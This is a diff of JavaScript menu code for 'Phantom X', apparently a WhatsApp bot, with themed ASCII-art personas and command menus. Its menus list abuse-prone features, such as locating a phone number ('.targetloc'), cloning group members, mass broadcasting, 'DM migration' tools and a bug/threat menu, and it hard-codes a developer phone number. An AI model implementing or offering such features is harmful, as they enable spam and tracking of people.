+    let o = `· · · · · · · · · · · · · · ·\n   ·   *P H A N T O M  X*   ·\n  · ·  _E · C · H · O_  · ·\n · · ·  )))  signal lost  · · ·\n· · · · · · · · · · · · · · ·\n\n  )))  Bot      ~  Phantom X\n  )))  Version  ~  v${BOT_VERSION}\n  )))  Mode     ~  ${ml}\n  )))  Uptime   ~  ${up}\n  )))  Time     ~  ${time}\n`;
+    for (const s of S) { o += `\n· · · · · · · · · · · · · · ·\n  ))) *${s.emoji} ${s.title}* (\n· · · · · · · · · · · · · · ·\n`; for (const [c] of s.items) o += `  ·))  *${c}*\n`; }
+    return (o + `\n· · · · · · · · · · · · · · ·\n  ))) _Phantom X — Echo fades. Ghost remains._ ·\n· · · · · · · · · · · · · · ·`).trim();
+}
+
+// --- MENU ---
+// ════════════════════════════════════════════════════════════════════
+// ░░░░░░░░░░░░░░░░░░░░  ECLIPSE PERSONALITY  ░░░░░░░░░░░░░░░░░░░░
+// 30-char wide menu surface. Short, precise replies. 3-stage .menu.
+// ════════════════════════════════════════════════════════════════════
+const ECLIPSE_WIDTH = 30;
+const ECLIPSE_BORDER = "═".repeat(ECLIPSE_WIDTH);
+const ECLIPSE_RULE   = "─".repeat(ECLIPSE_WIDTH);
+
+function eclipseCenter(text) {
+    const t = String(text);
+    if (t.length >= ECLIPSE_WIDTH) return t;
+    const pad = Math.floor((ECLIPSE_WIDTH - t.length) / 2);
+    return " ".repeat(pad) + t;
+}
+
+function eclipseHeader(title) {
+    return `${ECLIPSE_BORDER}\n${eclipseCenter(title)}\n${ECLIPSE_BORDER}`;
+}
+
+function eclipseFooter() {
+    return ECLIPSE_BORDER;
+}
+
+// Section tree — only legitimate sections.
+function getEclipseTree() {
+    return {
+        chains: {
+            title: "CHAINS OF BINDING",
+            cmd: ".chains",
+            blurb: "the dark hand. unbound.",
+            devOnly: false,
+            minis: [
+                { key: "binds",     title: "BINDINGS",     blurb: "group dominion.",
+                  cmds: [".add <num/reply>",".kick @user/reply",".promote @user/reply",".demote @user/reply",".link",".revoke",".lock",".unlock",".mute @user",".unmute @user",".groupinfo",".adminlist",".membercount",".everyone <msg>",".tagadmin <msg>",".groupid",".grouppic"] },
+                { key: "heralds",   title: "HERALDS",      blurb: "the call goes out.",
+                  cmds: [".hidetag",".tagall",".readmore",".broadcast <m> <msg>",".stopbroadcast",".schedule HH:MM <msg>",".unschedule HH:MM",".schedules"] },
+                { key: "rites",     title: "RITES",        blurb: "small spells, on loop.",
+                  cmds: [".autoreact on/off/<emoji>",".autoreply add/remove/list",".setalias <w> <.cmd>",".delalias <w>",".aliases"] },
+                { key: "wards",     title: "WARDS",        blurb: "the ward stands.",
+                  cmds: [".antilink on/off",".antispam on/off",".antimention on/off",".antidemote on/off",".antidelete on/off",".antibot on/off"] },
+                { key: "threshold", title: "THRESHOLD",    blurb: "joins and leavings.",
+                  cmds: [".welcome on/off",".goodbye on/off"] },
+                { key: "mirror",    title: "MIRROR",       blurb: "twin the host.",
+                  cmds: [".clone <src> <dst> <n> <m>",".stopclone"] },
+                { key: "judgment",  title: "JUDGMENT",     blurb: "the verdict falls.",
+                  cmds: [".warn @user",".warnlist",".resetwarn @user",".ban @user",".unban @user"] },
+                { key: "arena",     title: "ARENA",        blurb: "play in the dark.",
+                  cmds: [".ttt @p1 @p2",".truth",".dare",".wordchain <w>",".flip",".dice",".8ball <q>",".rps r/p/s",".slots",".trivia",".hangman <g>",".numguess",".riddle",".mathquiz",".wyr",".scramble"] },
+                { key: "revelry",   title: "REVELRY",      blurb: "the dark laughs.",
+                  cmds: [".joke",".fact",".quote",".roast @user",".compliment @user",".ship @a @b",".rate @user",".vibe @user",".horoscope <sign>"] },
+                { key: "compass",   title: "COMPASS",      blurb: "find your bearing.",
+                  cmds: [".calc <x>",".numinfo <num>",".targetloc <num>",".weather <city>",".translate <lang> <txt>",".bible <verse>",".quran <s:a>",".setstatus <txt>",".setname <name>"] },
+                { key: "conduit",   title: "CONDUIT",      blurb: "pull the signal.",
+                  cmds: [".dl <url>",".yt <url>",".ytmp3 <url>",".tiktok <url>",".ig <url>",".fb <url>",".x <url>",".sc <url>",".pin <url>",".reddit / .tumblr / .vimeo / .twitch",".dlhealth"] },
+                { key: "hourglass", title: "HOURGLASS",    blurb: "time on a leash.",
+                  cmds: [".remind <t> <txt>",".remind list / del <id>",".todo / .todo add <task>",".todo done <n> / del <n>",".note save/get/del <name>",".timer <t> [label]",".timer list / stop <id>",".countdown set <name> <date>",".countdown list / del",".calendar [yr] [mo]"] },
+                { key: "forge",     title: "FORGE",        blurb: "make small things.",
+                  cmds: [".sticker",".toimg",".qr <txt>",".genpwd <len>",".base64 enc/dec <txt>",".chat <msg>",".autojoin on/off"] },
+                { key: "pitch",     title: "PITCH",        blurb: "the green field.",
+                  cmds: [".pltable",".live",".plweek",".fixtures <club>",".fnews <club>",".football <club>",".h2h <c1> vs <c2>"] },
+                { key: "oracle",    title: "ORACLE",       blurb: "ask. it answers.",
+                  cmds: [".ai <q>",".imagine <prompt>",".solve",".song <title>",".lyrics <a> | <t>",".ss <url>",".viewonce",".ocr",".summarize",".atranslate <txt> <lang>",".codereview",".code <what>",".explain <topic>",".persona set/show/clear",".aichat <msg>",".tts <txt>",".voice <txt>"] },
+            ],
+        },
+        codex: {
+            title: "CODEX OF THE END",
+            cmd: ".codex",
+            blurb: "the pulse and the record.",
+            devOnly: false,
+            minis: [
+                { key: "pulse",   title: "PULSE",   blurb: "is it alive.",
+                  cmds: [".ping",".uptime",".info"] },
+                { key: "ledger",  title: "LEDGER",  blurb: "what the chamber knows.",
+                  cmds: [".groupid",".listonline",".listoffline",".linkedlist"] },
+            ],
+        },
+        ascend: {
+            title: "ASCENSION PROTOCOL",
+            cmd: ".ascend",
+            blurb: "to rise above the silent.",
+            devOnly: false,
+            minis: [
+                { key: "gate",    title: "THE GATE",     blurb: "what premium opens.",
+                  cmds: ["• priority response","• locked commands","• early features","ask the dev to be raised."] },
+                { key: "contact", title: "THE CONTACT",  blurb: "speak to the dev.",
+                  cmds: [".devnumber",".dev"] },
+            ],
+        },
+        flare: {
+            title: "SOLAR FLARE",
+            cmd: ".flare",
+            blurb: "when the dark falters.",
+            devOnly: false,
+            minis: [
+                { key: "guide",    title: "GUIDE",      blurb: "the brief.",
+                  cmds: [".help",".menu"] },
+                { key: "revival",  title: "REVIVAL",    blurb: "wake the link again.",
+                  cmds: [".restart",".reboot"] },
+                { key: "signal",   title: "SIGNAL",     blurb: "reach the dev.",
+                  cmds: [".devnumber",".dev",".report <text>"] },
+            ],
+        },
+        abyss: {
+            title: "EYE OF THE ABYSS",
+            cmd: ".abyss",
+            blurb: "the throne. dev only.",
+            devOnly: true,
+            minis: [
+                { key: "throne",   title: "THRONE",     blurb: "rule of the chamber.",
+                  cmds: [".mode public/owner",".public",".owner"] },
+                { key: "pact",     title: "PACT",       blurb: "open and seal cmds.",
+                  cmds: [".unleash allcmds",".unleash allcmds <num>",".unleash <cmd> all",".unleash <cmd> <num>",".cmdlock allcmds",".cmdlock <cmd>",".lockfor <num> <cmd>",".lockfor <num> allcmds",".unlockfor <num> <cmd>"] },
+                { key: "vault",    title: "VAULT",      blurb: "the premium gate.",
+                  cmds: [".premiumadd <num>",".premiumremove <num>",".premiumlist"] },
+                { key: "registry", title: "REGISTRY",   blurb: "the dev hands.",
+                  cmds: [".adddev <num>",".removedev <num>",".devlist"] },
+                { key: "silent",   title: "SILENT CHAMBER", blurb: "muffle a number.",
+                  cmds: [".silencenumber <num>",".unsilencenumber <num>",".silencelist"] },
+            ],
+        },
+    };
+}
+
+function getEclipseTopOrder() { return ["chains","codex","ascend","flare","abyss"]; }
+function getEclipseTopVisible(isDev) {
+    const tree = getEclipseTree();
+    return getEclipseTopOrder().filter(k => isDev || !tree[k].devOnly).map(k => ({ key: k, ...tree[k] }));
+}
+
+// ─── NEW 3-PANEL MENU TREE ────────────────────────────────────────────────────
+function getNewMenuTree() {
+    return {
+        owner: {
+            title: "OWNER MENU", emoji: "🔑", desc: "commands for the sovereign",
+            sections: {
+                nexus:    { title: "NEXUS",    blurb: "automation & broadcast",
+                    cmds: [".autoreact on/off/<emoji>",".autoreply add/remove/list",".setalias <trigger> <.cmd>",".delalias <trigger>",".aliases",".hidetag <msg>",".tagall <msg>",".readmore",".broadcast <mins> <msg>",".stopbroadcast",".schedule HH:MM <msg>",".unschedule HH:MM",".schedules",".clone <src> <dst> <batch> <mins>",".stopclone"] },
+                workshop: { title: "WORKSHOP", blurb: "utilities, tools & sports",
+                    cmds: [".sticker",".toimg",".qr <text>",".genpwd <length>",".base64 enc/dec <text>",".chat <msg>",".autojoin on/off",".calc <expr>",".numinfo <num>",".targetloc <num>",".weather <city>",".translate <lang> <text>",".bible <verse>",".quran <surah:ayah>",".setstatus <text>",".setname <name>",".remind <time> <text>",".todo add/done/del",".note save/get/del",".timer <time>",".countdown set/list",".calendar",".pltable",".live",".plweek",".fixtures <club>",".fnews <club>",".h2h <c1> vs <c2>"] },
+                neural:   { title: "NEURAL",   blurb: "AI, media & image editing",
+                    cmds: [".ai <question>",".imagine <prompt>",".solve",".song <title>",".lyrics <artist> | <title>",".ss <url>",".viewonce",".ocr",".summarize",".atranslate <text> <lang>",".code <what>",".explain <topic>",".aichat <msg>",".tts <text>",".voice <text>",".dl <url>",".yt <url>",".ytmp3 <url>",".tiktok <url>",".ig <url>",".fb <url>",".x <url>",".sc <url>",".pin <url>",".dlhealth",".blur",".invert",".grayscale",".brighten",".darken",".sharpen",".pixelate",".cartoon",".removebg",".upscale"] },
+                system:   { title: "SYSTEM",   blurb: "bot status & control",
+                    cmds: [".ping",".uptime",".info",".restart",".reboot",".listonline",".listoffline",".linkedlist",".mode public/owner",".dev",".devnumber",".setpp",".setmenupic",".profile",".persona eclipse/astraea",".menudesign 1-20"] },
+                fun:      { title: "FUN",      blurb: "bonus games & entertainment",
+                    cmds: [".akinator",".guessflag",".typingtest",".connect4",".werewolf"] },
+            }
+        },
+        group: {
+            title: "GROUP MENU", emoji: "🛡", desc: "group management & entertainment",
+            sections: {
+                citadel: { title: "CITADEL", blurb: "administration & security",
+                    cmds: [".add <number>",".kick @user",".promote @user",".demote @user",".link",".revoke",".lock",".unlock",".mute @user",".unmute @user",".groupinfo",".adminlist",".membercount",".everyone <msg>",".tagadmin <msg>",".groupid",".grouppic",".warn @user",".warnlist",".resetwarn @user",".ban @user",".unban @user",".antilink on/off",".antispam on/off",".antimention on/off",".antidemote on/off",".antidelete on/off",".antibot on/off",".welcome on/off",".goodbye on/off"] },
+                arcade:  { title: "ARCADE",  blurb: "games, fun & entertainment",
+                    cmds: [".rank",".ttt @p1 @p2",".truth",".dare",".wordchain <word>",".flip",".dice",".8ball <question>",".rps r/p/s",".slots",".trivia",".hangman",".numguess",".riddle",".mathquiz",".wyr",".scramble",".joke",".fact",".quote",".roast @user",".compliment @user",".ship @a @b",".rate @user",".vibe @user",".horoscope <sign>"] },
+            }
+        },
+        dev: {
+            title: "DEV MENU", emoji: "🔴", desc: "the silent throne — dev only",
+            sections: {
+                oversight: { title: "OVERSIGHT",     blurb: "dev control & access management",
+                    cmds: [".mode public/owner",".public",".owner",".unleash allcmds",".unleash <cmd> all",".unleash <cmd> <num>",".cmdlock allcmds",".cmdlock <cmd>",".lockfor <num> <cmd>",".unlockfor <num> <cmd>",".premiumadd <num>",".premiumremove <num>",".premiumlist",".adddev <num>",".removedev <num>",".devlist",".silencenumber <num>",".unsilencenumber <num>",".silencelist",".session",".sessionlist"] },
+                network:   { title: "NETWORK",       blurb: "threat system & reports",
+                    cmds: [".report <num> [category] [note]",".threats",".blacklist",".threatinfo <num>",".scan <num>",".unthreat <num>",".clearance <num>"] },
+                promo:     { title: "PROMO ENGINE",  blurb: "promotion & DM migration tools",
+                    cmds: [".promogroup status/on/off/setgroup/rate",".promogroup pool/add/remove/runnow",".regroup set/link/delay/start/stop",".linkwelcome",".antibug on/off/status"] },
+            }
+        },
+    };
+}
+
+// Eventide menu uses roman-numeral labels. Map them to Eclipse section keys.
+// [I]=chains  [II]=abyss  [IV]=codex  [V]=ascend  [Ø/0]=flare
+function eventideJumpKey(token) {
+    const t = String(token || "").toLowerCase().replace(/[.()\[\]]/g, "");
+    const map = {
+        "1":"chains", "i":"chains",
+        "2":"abyss",  "ii":"abyss",
+        "4":"codex",  "iv":"codex",
+        "5":"ascend", "v":"ascend",
+        "0":"flare",  "ø":"flare", "o":"flare",
+    };
+    return map[t] || null;
+}
+
+// User-authored ASCII art — DO NOT REFORMAT. Copied verbatim.
+function buildEclipseInit() {
+    return "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\n" +
+"▓        [EVENTIDE OMEGA] INITIALIZING...  ▓\n" +
+"▓  > Bypassing solar interference...    [OK  ▓                                      \n" +
+"▓   > Collapsing quantum states...       [OK]  ▓\n" +
+"▓   > Erasing redundant timelines...     [OK] ▓\n" +
+"▓   > Establishing void uplink...        [OK].  ▓\n" +
+"\n" +
+"▓       ⚠️  PERMANENT OCCULTATION       ▓                            DETECTED                                                     ▓                                                                    .▓                                       \n" +
+"▓          E C L I P S E   I S   A W A K E .          ▓                                                                 \n" +
+"▓ i am what remains when everything else                                                                                            ▓                         is deleted";
+}
+
+function buildEclipseVoid() {
+    return ".\n" +
+"        ◢██◣\n" +
+"     ◢████◣.           ╔═════════\n" +
+"    ◢██  ██◣.          ║     T H E   V O I D ║ \n" +
+"◢██   🌑   ██◣.    ║          E X S I T S  ║\n" +
+"    ◥██      ██◤.        ╚══════════╝.\n" +
+"     ◥██  ██◤\n" +
+"         ◢██◣\n" +
+"\n" +
+"════════════════════════════════════\n" +
+"   even in your darkest hour...\n" +
+"════════════════════════════════════";
+}
+
+function buildEclipseMain(isDev) {
+    return "" +
+"╔══════════╦══════════════╗\n" +
+"║       ⚠ EVENTIDE OMEGA TERMINAL \n" +
+"║                           ACCESS                                                                         \n" +
+"╚═══════════╩═════════════╝\n" +
+"\n" +
+"                ═══ E C L I P S E ═══\n" +
+"             \" i am what remains when \n" +
+"              everything else is deleted .\"\n" +
+"\n" +
+"╔══════════════════════╦══════════════════════╗\n" +
+"║ VOID SIGNATURE    ║     SYSTEM CORE          ║\n" +
+"║ 👤 @Unknown        ║    ECLIPSE: 100%     ║\n" +
+"║ ⚠ APOTHEOSIS     ║⚡ CORE:ABS ZERO     ║\n" +
+"║ 🩸 CORRUPT ███        ║                      ║\n" +
+"╚══════════════════════╩══════════════════════╝\n" +
+"\n" +
+"                   🌑 THE FINAL DUSK 🌑\n" +
+"            \" when the last star dies, \n" +
+"              i will still be typing .\"\n" +
+"\n" +
+"📡 SECURE │ Ω │ Vessels: ∞\n" +
+" You have summoned what \n" +
+" cannot be unsummoned";
+}
+
+// ════════════════════════════════════════════════════════════════════════════
+// ░░░░░  ASTRAEA PERSONA — second persona (golden, divine, judgmental)  ░░░░░
+// User-authored ASCII art — DO NOT REFORMAT. Copied verbatim.
+// ════════════════════════════════════════════════════════════════════════════
+
+function buildAstraeaInit() {
+    return "✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦\n" +
+"✦   *[CELESTIAL FORGE] — SUMMONING*  ✦\n" +
+"✦                            *ASTRAEA* ...                  ✦              \n" +
+"✦   > Purging shadows...              [✓]        ✦\n" +
+"✦   > Igniting divine core...     [✓]      .       ✦              \n" +
+"✦   > Opening the golden court...     [✓]   ✦\n" +
+"✦                                                                .✦\n" +
+"✦   ☀️ *ASTRAEA HAS DESCENDED.*        ✦\n" +
+"✦                                                                ✦ \n" +
+"✦                                                                 ✦                                                          \n" +
+"✦ \" *I DO NOT DELETE. I JUDGE, FOR I AM* ✦\n" +
+"✦                          *ASTRAEA* \"                    ✦                                                            \n" +
+"✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦";
+}
+
+function buildAstraeaMid() {
+    return ".            ✦✦✦\n" +
+"      ✦✦✦✦✦✦✦\n" +
+"    ✦✦✦  ☀️  ✦✦✦   ╔═══════════╗\n" +
+" ✦✦✦✦✦✦✦✦✦✦  ║  J U D G M E N T ║\n" +
+"    ✦✦✦✦✦✦✦✦      ║  A R R I V E S       ║\n" +
+"        ✦✦✦✦✦✦         ╚═══════════╝\n" +
+"             ✦✦✦";
+}
+
+function buildAstraeaMain(isDev) {
+    return "" +
+"╔══════════╦══════════════╗\n" +
+"║        ☀ *ASTRAEA* — *DIVINE* *SYSTEM ACCESS*               \n" +
+"╚══════════╩══════════════╝\n" +
+"\n" +
+"              ═══ ✦ *J U D G M E N T* ✦ ═══\n" +
+"          \" *i do not delete. i judge* .\"\n" +
+"\n" +
+"╔══════════════════════╦══════════════════════╗\n" +
+"║ *DIVINE CORE*        ║  *SYSTEM BALANCE* ║\n" +
+"║☀ GOLDEN: 100%║⚖ READY: EQUAL ║\n" +
+"║🔥WRATH: MODE ║ GRACE: ████░░   ║\n" +
+"╚══════════════════════╩══════════════════════╝\n" +
+"\n" +
+"                 🌑 *THE GOLDEN COURT* 🌑\n" +
+"        \" *every vessel stands trial* .\"\n" +
+"\n" +
+"📡 Uplink: *DIVINE* │ ☀ │ *Souls* : ∞\n" +
+"\" *the light does not ask permission. it simply arrives* .\"";
+}
+
+function buildEclipseSection(sectionKey, isDev) {
+    const tree = getEclipseTree();
+    const sec = tree[sectionKey];
+    if (!sec) return null;
+    if (sec.devOnly && !isDev) return null;
+    let out = `${ECLIPSE_BORDER}\n${eclipseCenter(sec.title)}\n${ECLIPSE_BORDER}\n`;
+    out += `   ${sec.blurb}\n\n`;
+    sec.minis.forEach((m, i) => {
+        out += `   ${String(i+1).padStart(2," ")}. ${m.title}\n`;
+    });
+    out += `\n   reply: ${sec.cmd} <number>\n`;
+    out += `   back: .menu\n`;
+    out += `${ECLIPSE_BORDER}`;
+    return out;
+}
+
+function buildEclipseMini(sectionKey, miniIdx, isDev) {
+    const tree = getEclipseTree();
+    const sec = tree[sectionKey];
+    if (!sec) return null;
+    if (sec.devOnly && !isDev) return null;
+    const m = sec.minis[miniIdx - 1];
+    if (!m) return null;
+    let out = `${ECLIPSE_BORDER}\n${eclipseCenter(m.title)}\n${ECLIPSE_BORDER}\n`;
+    out += `   ${m.blurb}\n\n`;
+    m.cmds.forEach(c => { out += `   ${c}\n`; });
+    out += `\n   back: ${sec.cmd}\n`;
+    out += `   home: .menu\n`;
+    out += `${ECLIPSE_BORDER}`;
+    return out;
+}
+
+// Short, precise Eclipse reply phrases (no technique exposure)
+const ECLIPSE_PHRASES = {
+    menu_open:        "the eclipse expands.",
+    mute:             "shackled.",
+    unmute:           "unbound.",
+    ban:              "extinguished.",
+    unban:            "restored.",
+    kick:             "cast out.",
+    promote:          "raised.",
+    demote:           "lowered.",
+    add:              "summoned.",
+    revoke:           "the bond is severed.",
+    link_reset:       "the bond is severed.",
+    antilink_on:      "the ward has been raised.",
+    antilink_off:     "the ward has fallen.",
+    antispam_on:      "the silence guard wakes.",
+    antispam_off:     "the silence guard sleeps.",
+    antimention_on:   "the silence holds.",
+    antimention_off:  "the silence breaks.",
+    antidemote_on:    "the throne is sealed.",
+    antidemote_off:   "the throne is open.",
+    antidelete_on:    "memory keeper bound.",
+    antidelete_off:   "memory keeper released.",
+    antibot_on:       "the gate scans.",
+    antibot_off:      "the gate is open.",
+    welcome_on:       "the threshold greets.",
+    welcome_off:      "the threshold is silent.",
+    goodbye_on:       "farewells will be spoken.",
+    goodbye_off:      "farewells silenced.",
+    mode_owner:       "the throne is sealed. owner only.",
+    mode_public:      "the gates are open.",
+    broadcast_start:  "the call goes out.",
+    broadcast_stop:   "silence.",
+    schedule_set:     "the hour is marked.",
+    schedule_clear:   "the hour is unmarked.",
+    warn:             "marked.",
+    warn_kicked:      "extinguished.",
+    warn_clear:       "the mark is gone.",
+    not_group:        "this rite needs a chamber.",
+    only_owner:       "only the dev speaks here.",
+    only_admin:       "only the throne speaks here.",
+    not_admin_note:   "i do not yet hold the throne here.",
+    bad_use:          "the rite is malformed.",
+};
+
+function eclipseSay(key) { return ECLIPSE_PHRASES[key] || ""; }
+
+// Persona-aware loading frames. Spaced 1s apart so WhatsApp actually renders
+// each edit instead of throttling them.
+function getPersonaScenes(persona) {
+    if (persona === "astraea") {
+        return {
+            init:  buildAstraeaInit(),
+            mid:   buildAstraeaMid(),
+            main:  buildAstraeaMain,
+            frames: [
+                "[░░░░░░░░░░]   0%   ☀ purging shadows",
+                "[████░░░░░░]  40%   ☀ igniting divine core",
+                "[████████░░]  80%   ☀ opening golden court",
+                "[██████████] 100%  ☀ ASTRAEA HAS DESCENDED",
+            ],
+        };
+    }
+    return {
+        init:  buildEclipseInit(),
+        mid:   buildEclipseVoid(),
+        main:  buildEclipseMain,
+        frames: [
+            "[░░░░░░░░░░]   0%   ▸ bypassing solar interference",
+            "[████░░░░░░]  40%   ▸ collapsing quantum states",
+            "[████████░░]  80%   ▸ severing last anchor",
+            "[██████████] 100%  ▸ ECLIPSE IS AWAKE",
+        ],
+    };
+}
+
+// 3-stage edited menu — used by .menu / .eclipse / .phantom / .astraea.
+// Two styles, switchable via .menustyle:
+//   "loading"  → stage 1 has a live 4-frame progress-bar that fills over ~4s
+//   "classic"  → stage 1 sits still for 4 seconds, no extra bar
+async function sendPersonaMenu(sock, from, msg, isDev, botJid) {
+    const STAGE_GAP = 4000;
+    const persona = getBotPersona(botJid);
+    const scenes = getPersonaScenes(persona);
+    const style = getMenuStyle(botJid);
+    const finalText = scenes.main(isDev);
+
+    // Banner is sent WITH the final stage, not upfront as a separate message
+    const bannerBuf = (() => {
+        try { return fs.existsSync(MENU_BANNER_FILE) ? fs.readFileSync(MENU_BANNER_FILE) : null; } catch (_) { return null; }
+    })();
+
+    async function sendFinal(editKey) {
+        const topRows = [
+            { id: "menu_owner", title: "👑 OWNER MENU", desc: "commands for the sovereign" },
+            { id: "menu_bug",   title: "🐞 BUG MENU",   desc: "bug reports, shields & threat tools" },
+            { id: "menu_group", title: "👥 GROUP MENU", desc: "group management & protection" },
+            { id: "menu_fun",   title: "🎮 FUN MENU",   desc: "games, jokes & entertainment" },
+        ];
+        if (isDev) topRows.push({ id: "menu_dev", title: "🔴 DEV MENU", desc: "the silent throne — dev only" });
+
+        // Stage 3: EDIT the same bubble to the final text (no deletion — all 3 stages edit the same message)
+        if (editKey) {
+            try { await sock.sendMessage(from, { text: finalText, edit: editKey }); } catch (_) {}
+        }
+        if (bannerBuf) {
+            // With banner: send image first, then the interactive list as a reply
+            try { await sock.sendMessage(from, { image: bannerBuf, caption: "" }, { quoted: msg }); } catch (_) {}
+        }
+        // Stage 3 button: ONE visible list button. When tapped, WhatsApp opens
+        // the overlay/bottom-sheet with Owner, Bug, Group and Fun menu options.
+        await sendListSelect(
+            sock,
+            from,
+            msg,
+            "🌑 *Tap the button below to open the Phantom-X menu sections:*",
+            "🌑 ⟢ NAVIGATE THE VOID ⟣ 🌑",
+            topRows
+        );
+    }
+
+    // CLASSIC — no progress bar, just three still stages
+    if (style === "classic") {
+        try { await sock.sendPresenceUpdate("composing", from); } catch (_) {}
+        try {
+            const sent = await sock.sendMessage(from, { text: scenes.init }, { quoted: msg });
+            await new Promise(r => setTimeout(r, STAGE_GAP));
+            try { await sock.sendPresenceUpdate("composing", from); } catch (_) {}
+            try { await sock.sendMessage(from, { text: scenes.mid, edit: sent.key }); } catch (_) {}
+            await new Promise(r => setTimeout(r, STAGE_GAP));
+            try { await sock.sendPresenceUpdate("composing", from); } catch (_) {}
+            await sendFinal(sent.key);
+            try { await sock.sendPresenceUpdate("paused", from); } catch (_) {}
+        } catch (_) {
+            await sendFinal(null);
+        }
+        return;
+    }
+
+    // LOADING — stage 1 with animated progress bar underneath the user's art
+    const frames = scenes.frames;
+    const frameMs = 1000;
+
+    try { await sock.sendPresenceUpdate("composing", from); } catch (_) {}
+    let sent;
+    try {
+        sent = await sock.sendMessage(from, { text: scenes.init + "\n\n" + frames[0] }, { quoted: msg });
+    } catch (_) {
+        await sendFinal(null);
+        return;
+    }
+
+    for (let i = 1; i < frames.length; i++) {
+        await new Promise(r => setTimeout(r, frameMs));
+        try {
+            await sock.sendMessage(from, { text: scenes.init + "\n\n" + frames[i], edit: sent.key });
+        } catch (e) { /* edit may be throttled — keep going */ }
+    }
+    await new Promise(r => setTimeout(r, frameMs));
+
+    // Stage 2 — middle scene
+    try { await sock.sendPresenceUpdate("composing", from); } catch (_) {}
+    try { await sock.sendMessage(from, { text: scenes.mid, edit: sent.key }); } catch (_) {}
+    await new Promise(r => setTimeout(r, STAGE_GAP));
+
+    // Stage 3 — final / terminal (with banner if set)
+    try { await sock.sendPresenceUpdate("composing", from); } catch (_) {}
+    await sendFinal(sent.key);
+    try { await sock.sendPresenceUpdate("paused", from); } catch (_) {}
+}
+
+// Backwards alias so older call sites keep working
+const sendEclipseMenu = sendPersonaMenu;
+
+// Generic handler for .chains/.codex/.ascend/.flare/.abyss
+async function sendEclipseSectionOrMini(sock, from, msg, sectionKey, parts, isDev) {
+    const tree = getEclipseTree();
+    const sec = tree[sectionKey];
+    if (!sec) return false;
+    if (sec.devOnly && !isDev) {
+        await sock.sendMessage(from, { text: eclipseSay("only_owner") }, { quoted: msg });
+        return true;
+    }
+    // Show section banner if one is set
+    const bannerMap = { abyss: OWNER_BANNER_FILE, chains: MENU_BANNER_FILE };
+    const bannerFile = bannerMap[sectionKey];
+    const arg = parseInt(parts[1], 10);
+    if (arg && arg >= 1 && arg <= sec.minis.length) {
+        const text = buildEclipseMini(sectionKey, arg, isDev);
+        if (text) {
+            if (bannerFile && fs.existsSync(bannerFile)) {
+                try { await sock.sendMessage(from, { image: fs.readFileSync(bannerFile), caption: text }, { quoted: msg }); return true; } catch (_) {}
+            }
+            await sock.sendMessage(from, { text }, { quoted: msg });
+        }
+    } else {
+        const text = buildEclipseSection(sectionKey, isDev);
+        if (text) {
+            if (bannerFile && fs.existsSync(bannerFile)) {
+                try { await sock.sendMessage(from, { image: fs.readFileSync(bannerFile), caption: text }, { quoted: msg }); return true; } catch (_) {}
+            }
+            await sock.sendMessage(from, { text }, { quoted: msg });
+        }
+    }
+    return true;
+}
+
+function buildEclipseHelp() {
+    return `${ECLIPSE_BORDER}\n${eclipseCenter("E C L I P S E")}\n${ECLIPSE_BORDER}\n` +
+           `   the eclipse listens.\n\n` +
+           `   .menu      open the eclipse\n` +
+           `   .chains    binding cmds\n` +
+           `   .codex     pulse and state\n` +
+           `   .ascend    rise above\n` +
+           `   .flare     emergency and dev\n\n` +
+           `   .info      version and uptime\n` +
+           `   .ping      pulse check\n` +
+           `${ECLIPSE_BORDER}`;
+}
+
+function buildEclipseDevContact() {
+    const num = (typeof DEV_NUMBERS !== "undefined" && DEV_NUMBERS[0]) || (process.env.DEV_NUMBERS || "").split(",")[0].trim() || "2348102756072";
+    return buildOmegaTerminal(
+        `      ◢◤ *THE ARCHITECT* ◢◤\n\n` +
+        `      [ 👤 ] : Phantom dev x\n` +
+        `      [ 🌐 ] : wa.me/${num}\n` +
+        `      [ 🏮 ] : *PRIMARY_VESSEL_01*\n\n` +
+        `   " *Creation is the first step*\n     *toward destruction* ."`
+    );
+}
+
+function buildEclipseInfo() {
+    const mu = process.memoryUsage();
+    const heapUsed = (mu.heapUsed / 1024 / 1024).toFixed(0);
+    const heapTotal = (mu.heapTotal / 1024 / 1024).toFixed(0);
+    return buildOmegaTerminal(
+        `   ░▒▓█ *CORE_MANIFEST* █▓▒░\n\n` +
+        `   ⧓ *VERSION* :: v${BOT_VERSION}_STABLE\n` +
+        `   ⧓ *RUNTIME* :: NODE_JS v${process.version.slice(1)}\n` +
+        `   ⧓ *UPTIME* :: ${formatUptime()}\n` +
+        `   ⧓ *MEMORY* :: ${heapUsed}MB / ${heapTotal}MB\n` +
+        `   ⧓ *SHIELD* :: BUG_SHIELD: ACTIVE\n\n` +
+        `   " *The machine does not sleep* .\n     *The machine only waits* ."`
+    );
+}
+
+// ─── EVENTIDE OMEGA TERMINAL ─────────────────────────────────────────────────
+// All command confirmations use this styled output for consistency.
+function buildOmegaTerminal(body) {
+    return (
+        `╔══════════╦══════════════╗\n` +
+        `║       ⚠ *EVENTIDE OMEGA TERMINAL*\n` +
+        `║                           *ACCESS*\n` +
+        `╚═══════════╩═════════════╝\n\n` +
+        body + `\n\n` +
+        `— *EVENTIDE OMEGA* · 👁`
+    );
+}
+
+// ─── INTERACTIVE MESSAGE HELPERS ─────────────────────────────────────────────
+// Sends an eclipse-styled message with tap-able quick-reply buttons.
+// Uses nativeFlowMessage inside viewOnceMessage — the current WA button format.
+// Falls back to numbered plain text on clients that don't support it.
+async function sendInteractiveButtons(sock, jid, quotedMsg, bodyText, buttons) {
+    // Delegate to sendListSelect so we keep ONE button pipeline that's known to
+    // work with the @whiskeysockets/baileys fork's interactiveButtons API.
+    // Vanilla @whiskeysockets/baileys silently strips these because it doesn't
+    // emit the biz/interactive/native_flow binary node wrappers WA requires.
+    const rows = buttons.map(b => ({ id: b.id, title: b.label, desc: "" }));
+    return sendListSelect(sock, jid, quotedMsg, bodyText, "📋 TAP TO SELECT", rows);
+}
+// ─── MENU NAVIGATION HANDLER ─────────────────────────────────────────────────
+// Called when user taps a list/button response from the 3-panel menu system.
+async function handleMenuNavigation(sock, jid, msg, buttonId, isDev) {
+    const tree = getNewMenuTree();
+
+    if (buttonId === "back_to_main") {
+        await sendPersonaMenuNav(sock, jid, msg, isDev, sock.user?.id || "");
+        return;
+    }
+    if (buttonId === "test_ok") {
+        await sock.sendMessage(jid, { text: buildOmegaTerminal(
+            `   ╔══ *🧪 BUTTON TEST* ══╗\n\n` +
